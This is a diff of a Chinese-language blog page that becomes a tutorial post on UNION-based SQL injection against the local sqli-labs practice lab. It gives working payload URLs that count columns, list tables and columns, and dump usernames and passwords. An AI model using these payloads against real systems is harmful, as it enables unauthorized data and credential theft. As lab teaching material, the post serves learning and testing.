@@ -6,14 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018/1 | looted&#39;s blog</title>
+  <title>SQL injection（联合查询） | looted&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="looted&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2018/01/index.html">
+  <meta name="description" content="前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧  sql注入的分类1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错型注入）3.Boolean-based blind SQL injection（布">
+<meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL injection（联合查询）">
+<meta property="og:url" content="http://yoursite.com/2018/01/07/sql-injection-一/index.html">
 <meta property="og:site_name" content="looted&#39;s blog">
+<meta property="og:description" content="前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧  sql注入的分类1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错型注入）3.Boolean-based blind SQL injection（布">
+<meta property="og:image" content="http://yoursite.com/img/sql/2.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/1.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/3.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/4.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/5.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/6.png">
+<meta property="og:image" content="http://yoursite.com/img/sql/7.png">
+<meta property="og:updated_time" content="2018-01-06T22:04:56.193Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="looted&#39;s blog">
+<meta name="twitter:title" content="SQL injection（联合查询）">
+<meta name="twitter:description" content="前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧  sql注入的分类1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错型注入）3.Boolean-based blind SQL injection（布">
+<meta name="twitter:image" content="http://yoursite.com/img/sql/2.png">
   
     <link rel="alternative" href="/atom.xml" title="looted&#39;s blog" type="application/atom+xml">
   
@@ -141,36 +154,88 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-sql-injection-一" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/07/sql-injection-一/" class="archive-article-date">
-  	<time datetime="2018-01-06T19:34:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/07/sql-injection-一/">SQL injection（联合查询）</a>
+    <h1 class="article-title" itemprop="name">
+      SQL injection（联合查询）
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/01/07/sql-injection-一/" class="archive-article-date">
+  	<time datetime="2018-01-06T19:34:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
+</a>
+        
+      </header>
+	  
+		<span class="archive-article-date">
+			阅读量 <span id="busuanzi_value_page_pv"></span>
+		</span>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<blockquote>
+<p>前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。<br>最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧</p>
+</blockquote>
+<h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p><strong>1.UNION query SQL injection（联合查询注入）<br>2.Error-based SQL injection（报错型注入）<br>3.Boolean-based blind SQL injection（布尔型注入）<br>4.Time-based blind SQL injection（基于时间延迟注入）<br>5.Stacked queries SQL injection（多语句查询注入）</strong></p>
+<h2 id="UNION-query-SQL-injection（联合查询注入）"><a href="#UNION-query-SQL-injection（联合查询注入）" class="headerlink" title="UNION query SQL injection（联合查询注入）"></a>UNION query SQL injection（联合查询注入）</h2><p>联合查询在sql注入里面是最快获取数据的方法<br>通过UNION来执行注入的sql语句，前提是请求返回后能输出SQL执行后查询到的所有内容</p>
+<p><strong>步骤：</strong><br>1.检测字段数<br>2.获取数据库基本信息<br>3.获取数据库所有的表<br>4.获取表的字段<br>5.获取表的内容</p>
+<h2 id="知识扫盲"><a href="#知识扫盲" class="headerlink" title="知识扫盲"></a>知识扫盲</h2><p><strong>user() <code>用户函数</code><br>database() <code>数据库函数</code><br>version() <code>版本号函数</code><br>information_schema<code>mysql自带的库，这个库保存了mysql服务器所有的信息</code><br>information_schema.schemata <code>含有所有数据库名的表</code><br>information_schema.tables <code>含有所有表名的表</code><br>information_schema.columns <code>含有所有列的表</code><br>concat_ws()<code>函数,字符串处理函数</code><br>char()<code>函数字符串函数</code><br>concat_ws()主要是处理char()函数，CHAR(32,58,32)解析出来就是<code>空格:空格</code>
+</strong></p>
+<h2 id="检测字段数"><a href="#检测字段数" class="headerlink" title="检测字段数"></a>检测字段数</h2><p>格式：’ order by (number)<br>’ order by 1 – +     <code>网页显示正常</code><br>’ order by 2 – +     <code>网页显示正常</code><br>’ order by 3 – +     <code>网页显示正常</code><br><img src="/img/sql/2.png" alt="“sql1”"><br>’ order by 4 – +     <code>网页显示错误</code><br><img src="/img/sql/1.png" alt="“sql2”"><br><strong>则字段数为4<br>检测字段数还有另一种方法<br>格式： ‘ union select 1,2,3,4,5……<br>依次从1开始检测，判定结果和order by一样<br>还有一个问题我们为什么要在语句后面加上<code>-- +</code>呢？<br>应该<code>-- +</code>在sql语句里表示结束的意思<br>除了<code>-- +</code>我们还可以使用<code>#</code>号，很多时候运维人员会限制掉<code>#</code>号，这时候我们可以用<code>%23</code>代替<br>检测字段后接下来我们来构建查询语句
+</strong></p>
+<h2 id="查询数据库基本信息"><a href="#查询数据库基本信息" class="headerlink" title="查询数据库基本信息"></a>查询数据库基本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- +</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/sql/3.png" alt="“sql3”"></p>
+<h2 id="查询表信息"><a href="#查询表信息" class="headerlink" title="查询表信息"></a>查询表信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,table_name,3 from information_schema.tables where table_schema=database() -- +</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/sql/4.png" alt="“sql4”"><br><strong>这里只显示了一个表怎么肥事咧？猜测应该是用了<code>limit</code>语句<br>我们可以在语句后面加上<code>limit</code>语句依次将所有的表列出来<br>不过这样太麻烦了，我们这时候用到<code>group_concat()</code>函数，讲他们一次全导出来 </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema=database() -- +</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/sql/5.png" alt="“sql5”"></p>
+<h2 id="查询列信息"><a href="#查询列信息" class="headerlink" title="查询列信息"></a>查询列信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name=0x7573657273 -- +</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/sql/6.png" alt="“sql6”"><br>注意，查询<code>information_schema</code>中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。<br><code>users</code>的十六进制转换是：<code>0x7573657273</code></p>
+<h2 id="查询表的内容"><a href="#查询表的内容" class="headerlink" title="查询表的内容"></a>查询表的内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users -- +</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/sql/7.png" alt="“sql7”"></p>
+<blockquote>
+<p>这篇联合查询的文章就不写脚本了，等下一篇基于错误的sql注入再写</p>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wechat.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -182,215 +247,86 @@
 		</ul>
 	</div>
 
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/05/js微信跳转支付宝/" class="archive-article-date">
-  	<time datetime="2018-01-05T11:20:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-05</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/05/js微信跳转支付宝/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">js微信跳转支付宝</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/05/js微信跳转支付宝/">js微信跳转支付宝</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">JS跳转</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/03/kali实现的进程实时显示/" class="archive-article-date">
-  	<time datetime="2018-01-03T14:57:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/03/kali实现的进程实时显示/">kali实现的进程实时显示</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">kai</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">系统美化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/02/校园网渗透测试-系统层篇/" class="archive-article-date">
-  	<time datetime="2018-01-02T11:13:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/02/校园网渗透测试-系统层篇/">校园网渗透测试(系统层篇)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透思路</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/02/2017-BDCTF/" class="archive-article-date">
-  	<time datetime="2018-01-02T08:40:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/02/2017-BDCTF/">2017-BDCTF</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">蓝盾CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">高校杯</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF解题</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/01/hello-world/" class="archive-article-date">
-  	<time datetime="2018-01-01T09:16:49.700Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/01/hello-world/">Welcome to looted’s blog</a>
-    </h1>
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script src="/Valine.min.js"></script>
+<script>
+   var notify = 'true' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '#vcomment',
+            notify: notify,
+            verify: verify,
+            app_id: "oKYfcplcKAV7KNQLRl3cn45m-gzGzoHsz",
+            app_key: "kEVrLfVvi3zlCclIYRwVXFgb",
+            placeholder: "评论一下吧！",
+            avatar:"/img/pl.png"
+        });
+    }
+</script>
+    </section>
   
 
-        <div class="article-info info-on-right">
-          
-          
+  
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+
 
     
-
 
           </div>
         </div>
@@ -417,8 +353,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
